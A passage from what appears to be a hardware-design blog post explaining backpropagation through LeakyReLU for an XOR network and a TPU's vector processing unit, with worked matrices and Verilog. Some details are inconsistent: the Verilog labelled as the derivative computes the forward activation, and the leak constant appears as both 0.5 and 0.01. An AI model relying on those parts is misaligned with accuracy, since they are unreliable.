stretchy="false">]</mo><mo>=</mo><mn>0.2631</mn></mrow><annotation encoding="application/x-tex">\mathcal{L} = \frac{1}{4}[0.3155 + 0.2168 + 0.1107 + 0.4096] = 0.2631</annotation></semantics></math></span></span></span></p></div><p>This loss value tells us how far off our predictions are from the true XOR outputs.</p></div><p>So right after we finish computing our final layer's activations (let's call them<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{H}_2</annotation></semantics></math></span></span></span>), we immediately stream them into a loss module to calculate just how bad our predictions are. These loss modules sit right below our activation modules, and we only use them when we've reached our final layer. But here's the key insight: you don't actually need to calculate the loss value itself to train. You just need its derivative. Why? Because that derivative tells us which direction to adjust our weights to make the loss smaller. It's like having a compass that points toward "better performance."</p><h3>The magic of the chain rule</h3><p>This is where calculus enters the picture. To make our model better, we need to figure out how changing each weight affects our loss. The chain rule lets us break this massive calculation into smaller, manageable pieces.</p><div><p>The chain rule for gradients:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">W</mi></mrow></mfrac><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">Z</mi></mrow></mfrac><mo>⋅</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">Z</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">W</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{W}} = \frac{\partial \mathcal{L}}{\partial \mathbf{Z}} \cdot \frac{\partial \mathbf{Z}}{\partial \mathbf{W}}</annotation></semantics></math></span></span></span></p></div><p>This allows us to compute gradients layer by layer, propagating them backwards through the network</p></div><p><img alt="Long chain diagram" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/longchain.svg"></p><p>Let's trace through what happens step by step.</p><ol><li>Calculate<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{H}_2}</annotation></semantics></math></span></span></span> <!-- -->- how much the loss changes with respect to our final activations.</li><br><li>Compute<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{H}_2}{\partial \mathbf{Z}_2}</annotation></semantics></math></span></span></span> <!-- -->by taking the derivative of the activation (leaky ReLU in our case).</li><br><li>Compute<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">W</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{Z}_2}{\partial \mathbf{W}_2}</annotation></semantics></math></span></span></span>,<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{Z}_2}{\partial \mathbf{H}_2}</annotation></semantics></math></span></span></span></li></ol></div><p>Since all elements of <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold">z</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{z}_2</annotation></semantics></math></span></span></span> are positive, the LeakyReLU gradient is 1:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">b</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{Z}_2}{\partial \mathbf{b}_2}</annotation></semantics></math></span></span></span></p></div><h3>The beautiful symmetry of forward and backward pass</h3><p>After drawing out the entire computational graph, we discovered something remarkable: the longest chain in backpropagation closely resembles forward pass! In forward pass, we multiply activation matrices with transposed weight matrices. In backward pass, we multiply gradient matrices with weight matrices (untransposed). It's like looking in a mirror!</p><div><p>Propagating gradients to the hidden layer:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>1</mn></msub></mrow></mfrac><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">z</mi><mn>2</mn></msub></mrow></mfrac><msub><mi mathvariant="bold">W</mi><mn>2</mn></msub><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2808</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.2328</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.1664</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.3200</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.5266</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.2958</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.1479</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0831</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.1226</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0689</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0876</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0492</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.1685</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0947</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{H}_1} = \frac{\partial \mathcal{L}}{\partial \mathbf{z}_2} \mathbf{W}_2 = \begin{bmatrix} \phantom{-}0.2808\phantom{0} \\[0.5em] -0.2328\phantom{0} \\[0.5em] -0.1664\phantom{0} \\[0.5em] \phantom{-}0.3200\phantom{0} \end{bmatrix} \begin{bmatrix} \phantom{-}0.5266\phantom{0} &amp; \phantom{-}0.2958\phantom{0} \end{bmatrix} = \begin{bmatrix} \phantom{-}0.1479\phantom{0} &amp; \phantom{-}0.0831\phantom{0} \\[0.5em] -0.1226\phantom{0} &amp; -0.0689\phantom{0} \\[0.5em] -0.0876\phantom{0} &amp; -0.0492\phantom{0} \\[0.5em] \phantom{-}0.1685\phantom{0} &amp; \phantom{-}0.0947\phantom{0} \end{bmatrix}</annotation></semantics></math></span></span></span></p></div><p>And through the first layer's activation:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub></mrow></mfrac><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>1</mn></msub></mrow></mfrac><mo>⊙</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mtext>LeakyReLU</mtext><mn>0.5</mn></msub><mo stretchy="false">(</mo><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{Z}_1} = \frac{\partial \mathcal{L}}{\partial \mathbf{H}_1} \odot \frac{\partial \text{LeakyReLU}_{0.5}(\mathbf{Z}_1)}{\partial \mathbf{Z}_1}</annotation></semantics></math></span></span></span></p></div><p>With mixed positive and negative values in<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">\mathbf{Z}_1</annotation></semantics></math></span></span></span>, the gradient is:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>1</mn></msub></mrow></mfrac><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.1479</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0831</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.1226</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0689</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0876</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0492</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.1685</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0947</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>⊙</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>0.5</mn><mphantom><mn>.0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>1</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>0.5</mn><mphantom><mn>.0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>1</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>0.5</mn><mphantom><mn>.0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>1</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>0.5</mn><mphantom><mn>.0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mi mathvariant="normal">.</mi></mphantom><mn>1</mn><mphantom><mi mathvariant="normal">.</mi></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0739</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0831</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0613</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0689</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0438</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>0.0492</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0843</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mphantom><mo>−</mo></mphantom><mn>0.0947</mn><mphantom><mn>0</mn></mphantom></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{Z}_1} = \begin{bmatrix} \phantom{-}0.1479\phantom{0} &amp; \phantom{-}0.0831\phantom{0} \\[0.5em] -0.1226\phantom{0} &amp; -0.0689\phantom{0} \\[0.5em] -0.0876\phantom{0} &amp; -0.0492\phantom{0} \\[0.5em] \phantom{-}0.1685\phantom{0} &amp; \phantom{-}0.0947\phantom{0} \end{bmatrix} \odot \begin{bmatrix} \phantom{.}0.5\phantom{.0} &amp; \phantom{.}1\phantom{.} \\[0.5em] \phantom{.}0.5\phantom{.0} &amp; \phantom{.}1\phantom{.} \\[0.5em] \phantom{.}0.5\phantom{.0} &amp; \phantom{.}1\phantom{.} \\[0.5em] \phantom{.}0.5\phantom{.0} &amp; \phantom{.}1\phantom{.} \end{bmatrix} = \begin{bmatrix} \phantom{-}0.0739\phantom{0} &amp; \phantom{-}0.0831\phantom{0} \\[0.5em] -0.0613\phantom{0} &amp; -0.0689\phantom{0} \\[0.5em] -0.0438\phantom{0} &amp; -0.0492\phantom{0} \\[0.5em] \phantom{-}0.0843\phantom{0} &amp; \phantom{-}0.0947\phantom{0} \end{bmatrix}</annotation></semantics></math></span></span></span></p></div></div><p>Once we have all of these individual derivatives, we can multiply them together to find any derivative with respect of the loss (i.e.<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow></mfrac><mo>⋅</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow></mfrac><mo>⋅</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">W</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{H}_2} \cdot \frac{\partial \mathbf{H}_2}{\partial \mathbf{Z}_2} \cdot \frac{\partial \mathbf{Z}_2}{\partial \mathbf{W}_2}</annotation></semantics></math></span></span></span> <!-- -->gives us<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">W</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{W}_2}</annotation></semantics></math></span></span></span>).</p><p>After that, we have to compute the activation derivative<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">H</mi><mn>2</mn></msub></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{H}_2}{\partial \mathbf{Z}_2}</annotation></semantics></math></span></span></span>, for which the formula is<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mtext>LeakyReLU</mtext><mi>α</mi></msub><mo stretchy="false">(</mo><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub></mrow></mfrac><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>α</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><msub><mi mathvariant="bold">Z</mi><mn>2</mn></msub><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\frac{\partial \text{LeakyReLU}_{\alpha}(\mathbf{Z}_2)}{\partial \mathbf{Z}_2} = \begin{cases} 1 &amp; \text{if } \mathbf{Z}_2 &gt; 0 \\[0.3em] \alpha &amp; \text{if } \mathbf{Z}_2 \leq 0 \end{cases}</annotation></semantics></math></span></span></span>. This is also an element-wise computation, meaning we can structure it exactly like the loss module (and bias and activation modules), but it will perform a different calculation. One important note about this module, however, is that it requires the activations we computed during forward pass.</p><p>Now you might be wondering — how do we actually compute derivatives in hardware? Let's look at Leaky ReLU as an example, since it's beautifully simple but demonstrates the key principles. Remember that Leaky ReLU applies different operations based on whether the input is positive or negative. The derivative follows the same pattern: it outputs 1 for positive inputs and a small constant (we used 0.01) for negative inputs.</p><div><p>The Leaky ReLU gradient:</p><div><p><span><span><span><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><msub><mtext>LeakyReLU</mtext><mi>α</mi></msub><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><mi>z</mi></mrow></mfrac><mo>=</mo><mrow><mo fence="true">{</mo><mtable rowspacing="0.36em" columnalign="left left" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>z</mi><mo>&gt;</mo><mn>0</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>α</mi></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mtext>if&nbsp;</mtext><mi>z</mi><mo>≤</mo><mn>0</mn></mrow></mstyle></mtd></mtr></mtable></mrow></mrow><annotation encoding="application/x-tex">\frac{\partial \text{LeakyReLU}_\alpha(z)}{\partial z} = \begin{cases} 1 &amp; \text{if } z &gt; 0 \\[0.3em] \alpha &amp; \text{if } z \leq 0 \end{cases}</annotation></semantics></math></span></span></span></p></div></div><pre><code><span>always</span> @<span>(</span><span>posedge</span> <span>clk</span><span>)</span> <span>begin</span>
    <span>if</span> <span>(</span><span>rst</span><span>)</span> <span>begin</span>
        <span>output</span> <span>&lt;=</span> <span>0</span>;
    <span>end</span> <span>else</span> <span>begin</span>
        <span>output</span> <span>&lt;=</span> <span>(</span><span>input</span> <span>&gt;</span> <span>0</span><span>)</span> <span>?</span> <span>input</span> <span>:</span> <span>0</span>.01 <span>*</span> <span>input</span>;
    <span>end</span>
<span>end</span>
</code></pre><figure><p><img alt="Leaky ReLU derivative" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/leaky-relu-derivative.svg"></p><figcaption>Leaky ReLU derivative implementation in hardware showing the conditional logic</figcaption></figure><p>What's beautiful about this is that it's just a simple comparison – no complex arithmetic needed. The hardware can compute this derivative in a single clock cycle, keeping our pipeline flowing smoothly. This same principle applies to other activation functions: their derivatives often simplify to basic operations that hardware can execute very efficiently. This insight led us to compute the long chain first — getting all our<span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="script">L</mi></mrow><mrow><mi mathvariant="normal">∂</mi><msub><mi mathvariant="bold">Z</mi><mi>n</mi></msub></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathcal{L}}{\partial \mathbf{Z}_n}</annotation></semantics></math></span></span></span> <!-- -->gradients just like we computed activations in forward pass. We could cache these gradients and reuse them, following the same efficient pattern we'd already mastered.</p><div><p>You'll notice a really cool pattern emerging: all these modules that sit underneath the systolic array process column vectors that stream out one by one. This gave us the idea to unify them into something we called a <b>vector processing unit (VPU)</b> – because that's exactly what they're doing, processing vectors element-wise!<sup><a href="#fn6" id="fn6-ref">[6]</a></sup></p><p>Not only is this more elegant to work with, it's also useful when we scale our TPU beyond a 2x2 systolic array, as we'll have N number of these modules (N being the size of the systolic array), each of which we would have to interface with individually. Unifying these modules under a parent module makes our design more scalable and elegant!</p></div><figure><p><img alt="Vector processing unit" loading="lazy" decoding="async" data-nimg="fill" src="https://www.tinytpu.com/vpu.svg"></p><figcaption>Vector Processing Unit (VPU) architecture showing unified element-wise operations</figcaption></figure><p>Additionally, by incorporating control signals for each module, which we call the VPU pathway bits, we can selectively enable or skip specific operations. This makes the VPU flexible enough to support both inference and training. For instance, during the forward pass, we want to apply biases and activations but skip computing loss or activation derivatives. When transitioning to the backward pass, all modules are engaged, but within the backward chain we only need to compute the activation derivative. Due to pipelining, all values that flow through the VPU pass through each of the four modules, and any unused modules simply act as registers, forwarding their inputs to outputs without performing computation.</p><p>The next few derivatives are interesting because we can actually use matrix multiplication (and the systolic array!) to compute the derivatives with the help of these three identities:</p><ol><li>If we have<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">Z</mi><mo>=</mo><mi mathvariant="bold">X</mi><msup><mi mathvariant="bold">W</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">\mathbf{Z} = \mathbf{X}\mathbf{W}^T</annotation></semantics></math></span></span></span> and take its derivative with respect to the weights, we get<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">Z</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">W</mi></mrow></mfrac><mo>=</mo><mi mathvariant="bold">X</mi></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{Z}}{\partial \mathbf{W}} = \mathbf{X}</annotation></semantics></math></span></span></span></li><li>If we have<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">Z</mi><mo>=</mo><mi mathvariant="bold">X</mi><msup><mi mathvariant="bold">W</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">\mathbf{Z} = \mathbf{X}\mathbf{W}^T</annotation></semantics></math></span></span></span> and take its derivative with respect to the inputs<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">X</mi></mrow><annotation encoding="application/x-tex">\mathbf{X}</annotation></semantics></math></span></span></span>, we get<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">Z</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">X</mi></mrow></mfrac><mo>=</mo><msup><mi mathvariant="bold">W</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{Z}}{\partial \mathbf{X}} = \mathbf{W}^T</annotation></semantics></math></span></span></span> <!-- -->(just the weight matrix transposed)</li><li>For the bias term, the derivative is simply 1.</li></ol><p>This means that we can multiply the previous<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">H</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">Z</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial \mathbf{H}}{\partial \mathbf{Z}}</annotation></semantics></math></span></span></span> <!-- -->with <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="bold">X</mi></mrow><annotation encoding="application/x-tex">\mathbf{X}</annotation></semantics></math></span></span></span>,<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi mathvariant="bold">W</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">\mathbf{W}^T</annotation></semantics></math></span></span></span>, and 1 to get<!-- --> <span data-testid="react-katex"><span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">H</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="bold">W</mi></mrow></mfrac></mrow><annotation 